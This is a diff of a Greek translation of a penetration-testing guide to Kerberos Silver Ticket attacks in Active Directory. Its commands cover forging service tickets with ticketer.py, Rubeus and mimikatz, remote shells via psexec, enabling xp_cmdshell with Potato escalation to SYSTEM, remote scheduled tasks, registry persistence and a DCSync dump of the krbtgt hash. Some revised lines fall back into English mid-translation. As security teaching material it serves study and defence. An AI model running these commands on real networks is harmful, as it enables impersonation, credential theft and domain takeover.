@@ -6,13 +6,13 @@
 
 ## Silver ticket
 
-The **Silver Ticket** attack involves the exploitation of service tickets in Active Directory (AD) environments. This method relies on **acquiring the NTLM hash of a service account**, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, **impersonating any user**, typically aiming for administrative privileges. It's emphasized that using AES keys for forging tickets is more secure and less detectable.
+Η επίθεση Silver Ticket περιλαμβάνει την εκμετάλλευση των service tickets σε περιβάλλοντα Active Directory (AD). Αυτή η μέθοδος βασίζεται στην απόκτηση του NTLM hash ενός service account, όπως ενός computer account, για να πλαστογραφηθεί ένα Ticket Granting Service (TGS) ticket. Με αυτό το παραποιημένο ticket, ένας attacker μπορεί να αποκτήσει πρόσβαση σε συγκεκριμένες υπηρεσίες στο δίκτυο, υποδυόμενος οποιονδήποτε χρήστη, συνήθως στοχεύοντας σε δικαιώματα διαχειριστή. Επισημαίνεται ότι η χρήση AES keys για την παραποίηση tickets είναι πιο ασφαλής και λιγότερο εντοπίσιμη.
 
 > [!WARNING]
-> Silver Tickets are less detectable than Golden Tickets because they only require the **hash of the service account**, not the krbtgt account. However, they are limited to the specific service they target. Moreover, just stealing the password of a user.
-Moreover, if you compromise an **account's password with a SPN** you can use that password to create a Silver Ticket impersonating any user to that service.
+> Silver Tickets είναι λιγότερο εντοπίσιμα από Golden Tickets επειδή απαιτούν μόνο το **hash του service account**, όχι το krbtgt account. Ωστόσο, είναι περιορισμένα στην συγκεκριμένη υπηρεσία που στοχεύουν. Επιπλέον, αρκεί η κλοπή του password ενός χρήστη.
+> Επιπλέον, αν συμβιβάσετε το **account's password with a SPN** μπορείτε να χρησιμοποιήσετε αυτό το password για να δημιουργήσετε ένα Silver Ticket που θα υποδύεται οποιονδήποτε χρήστη για εκείνη την υπηρεσία.
 
-Για τη δημιουργία των tickets, χρησιμοποιούνται διαφορετικά εργαλεία ανάλογα με το λειτουργικό σύστημα:
+For ticket crafting, different tools are employed based on the operating system:
 
 ### Σε Linux
 ```bash
@@ -20,7 +20,7 @@ python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
 python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
-### Στα Windows
+### Σε Windows
 ```bash
 # Using Rubeus
 ## /ldap option is used to get domain data automatically
@@ -37,11 +37,11 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
-Η υπηρεσία CIFS επισημαίνεται ως κοινός στόχος για πρόσβαση στο σύστημα αρχείων του θύματος, αλλά άλλες υπηρεσίες όπως HOST και RPCSS μπορούν επίσης να εκμεταλλευτούνται για εργασίες και ερωτήματα WMI.
+Η υπηρεσία CIFS επισημαίνεται ως συνηθισμένος στόχος για πρόσβαση στο σύστημα αρχείων του θύματος, αλλά άλλες υπηρεσίες όπως HOST και RPCSS μπορούν επίσης να εκμεταλλευτούν για εργασίες και ερωτήματα WMI.
 
-### Παράδειγμα: MSSQL υπηρεσία (MSSQLSvc) + Potato σε SYSTEM
+### Παράδειγμα: MSSQL υπηρεσία (MSSQLSvc) + Potato to SYSTEM
 
-Εάν έχετε το NTLM hash (ή το AES key) ενός λογαριασμού υπηρεσίας SQL (π.χ. sqlsvc), μπορείτε να πλαστογραφήσετε ένα TGS για το MSSQL SPN και να προσωμοιώσετε οποιονδήποτε χρήστη στην υπηρεσία SQL. Από εκεί, ενεργοποιήστε το xp_cmdshell για να εκτελέσετε εντολές ως ο λογαριασμός υπηρεσίας SQL. Εάν αυτό το token έχει SeImpersonatePrivilege, αλυσοδέστε ένα Potato για να αναβαθμίσετε σε SYSTEM.
+Εάν έχετε το NTLM hash (ή το AES key) ενός SQL service account (π.χ., sqlsvc), μπορείτε να forge ένα TGS για το MSSQL SPN και να impersonate οποιονδήποτε χρήστη προς την SQL service. Από εκεί, ενεργοποιήστε το xp_cmdshell για να εκτελέσετε εντολές ως ο SQL service account. Εάν αυτό το token έχει SeImpersonatePrivilege, chain ένα Potato για να elevate σε SYSTEM.
 ```bash
 # Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
 python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
@@ -52,14 +52,14 @@ export KRB5CCNAME=$PWD/administrator.ccache
 impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
 -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
 ```
-- Εάν το προκύπτον πλαίσιο έχει SeImpersonatePrivilege (συχνά αληθές για service accounts), χρησιμοποίησε μια παραλλαγή Potato για να αποκτήσεις SYSTEM:
+- Εάν το προκύπτον πλαίσιο έχει SeImpersonatePrivilege (συνήθως ισχύει για τους λογαριασμούς υπηρεσίας), χρησιμοποιήστε μια παραλλαγή Potato για να αποκτήσετε SYSTEM:
 ```bash
 # On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
 PrintSpoofer.exe -c "cmd /c whoami"
 # or
 GodPotato -cmd "cmd /c whoami"
 ```
-Περισσότερες λεπτομέρειες για την κατάχρηση του MSSQL και την ενεργοποίηση του xp_cmdshell:
+Περισσότερες λεπτομέρειες για την εκμετάλλευση του MSSQL και την ενεργοποίηση του xp_cmdshell:
 
 {{#ref}}
 abusing-ad-mssql.md
@@ -73,44 +73,45 @@ abusing-ad-mssql.md
 
 ## Διαθέσιμες Υπηρεσίες
 
-| Τύπος Υπηρεσίας                           | Υπηρεσία Silver Tickets                                                    |
-| ---------------------------------------- | -------------------------------------------------------------------------- |
+| Τύπος Υπηρεσίας                           | Silver Tickets Υπηρεσίας                                                  |
+| ---------------------------------------- | ------------------------------------------------------------------------- |
 | WMI                                      | <p>HOST</p><p>RPCSS</p>                                                    |
-| PowerShell Remoting                      | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                    | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
+| PowerShell Remoting                      | <p>HOST</p><p>HTTP</p><p>Ανάλογα με το λειτουργικό σύστημα επίσης:</p><p>WSMAN</p><p>RPCSS</p> |
+| WinRM                                    | <p>HOST</p><p>HTTP</p><p>Σε ορισμένες περιπτώσεις μπορείτε απλά να ζητήσετε: WINRM</p> |
 | Scheduled Tasks                          | HOST                                                                       |
 | Windows File Share, also psexec          | CIFS                                                                       |
 | LDAP operations, included DCSync         | LDAP                                                                       |
 | Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
 | Golden Tickets                           | krbtgt                                                                     |
 
-Χρησιμοποιώντας **Rubeus** μπορείτε να ζητήσετε όλα αυτά τα tickets χρησιμοποιώντας την παράμετρο:
+Using **Rubeus** you may **ask for all** these tickets using the parameter:
 
 - `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### Event IDs για Silver tickets
+### Silver tickets Event IDs
 
-- 4624: Account Logon
-- 4634: Account Logoff
-- 4672: Admin Logon
+- 4624: Σύνδεση λογαριασμού
+- 4634: Αποσύνδεση λογαριασμού
+- 4672: Σύνδεση διαχειριστή
 
-## Διατήρηση πρόσβασης
+## Επιμονή
 
-Για να αποφύγετε τα μηχανήματα από το να αλλάζουν τον κωδικό τους κάθε 30 ημέρες ορίστε `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` ή μπορείτε να ορίσετε `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` σε μια τιμή μεγαλύτερη από 30 ημέρες για να υποδείξετε την περίοδο περιστροφής στην οποία πρέπει να περιστραφεί ο κωδικός του μηχανήματος.
+To avoid machines from rotating their password every 30 days set  `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` or you could set `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` to a bigger value than 30days to indicate the rotation perdiod when the machines password should be rotated.
 
-## Κατάχρηση Service tickets
+## Εκμετάλλευση Service tickets
 
-Στα ακόλουθα παραδείγματα ας υποθέσουμε ότι το ticket αποκτήθηκε προσωποποιώντας τον λογαριασμό διαχειριστή.
+Στα παρακάτω παραδείγματα ας υποθέσουμε ότι το ticket αποκτήθηκε μιμούμενο τον λογαριασμό διαχειριστή.
 
 ### CIFS
 
-Με αυτό το ticket θα μπορέσετε να αποκτήσετε πρόσβαση στους φακέλους `C$` και `ADMIN$` μέσω **SMB** (εφόσον είναι εκτεθειμένοι) και να αντιγράψετε αρχεία σε μέρος του απομακρυσμένου filesystem απλώς κάνοντας κάτι σαν:
+With this ticket you will be able to access the `C$` and `ADMIN$` folder via **SMB** (if they are exposed) and copy files to a part of the remote filesystem just doing something like:
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-Θα μπορείτε επίσης να αποκτήσετε shell στον host ή να εκτελέσετε αυθαίρετες εντολές χρησιμοποιώντας **psexec**:
+Θα μπορείτε επίσης να αποκτήσετε ένα shell μέσα στον host ή να εκτελέσετε αυθαίρετες εντολές χρησιμοποιώντας **psexec**:
+
 
 {{#ref}}
 ../lateral-movement/psexec-and-winexec.md
@@ -118,7 +119,7 @@ copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 
 ### HOST
 
-Με αυτήν την άδεια μπορείτε να δημιουργήσετε scheduled tasks σε απομακρυσμένους υπολογιστές και να εκτελέσετε αυθαίρετες εντολές:
+Με αυτή την άδεια μπορείτε να δημιουργήσετε scheduled tasks σε απομακρυσμένους υπολογιστές και να εκτελέσετε αυθαίρετες εντολές:
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -151,11 +152,11 @@ wmic remote.computer.local list full /format:list
 
 ### HOST + WSMAN (WINRM)
 
-Με πρόσβαση winrm σε έναν υπολογιστή μπορείτε να **έχετε πρόσβαση σε αυτόν** και ακόμη να αποκτήσετε ένα PowerShell:
+Με πρόσβαση σε winrm σε έναν υπολογιστή μπορείτε να **έχετε πρόσβαση σε αυτόν** και ακόμη να αποκτήσετε PowerShell:
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-Ελέγξτε την παρακάτω σελίδα για να μάθετε **περισσότερους τρόπους σύνδεσης με έναν απομακρυσμένο host χρησιμοποιώντας winrm**:
+Check the following page to learn **more ways to connect with a remote host using winrm**:
 
 
 {{#ref}}
@@ -163,11 +164,11 @@ New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 {{#endref}}
 
 > [!WARNING]
-> Σημειώστε ότι **το winrm πρέπει να είναι ενεργό και να ακούει** στον απομακρυσμένο υπολογιστή για να έχετε πρόσβαση.
+> Σημειώστε ότι **το winrm πρέπει να είναι ενεργό και να ακούει** στον απομακρυσμένο υπολογιστή για να είναι προσβάσιμο.
 
 ### LDAP
 
-Με αυτό το προνόμιο μπορείτε να κάνετε dump στη βάση δεδομένων του DC χρησιμοποιώντας **DCSync**:
+Με αυτό το προνόμιο μπορείτε να dump τη βάση δεδομένων του DC χρησιμοποιώντας το **DCSync**:
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
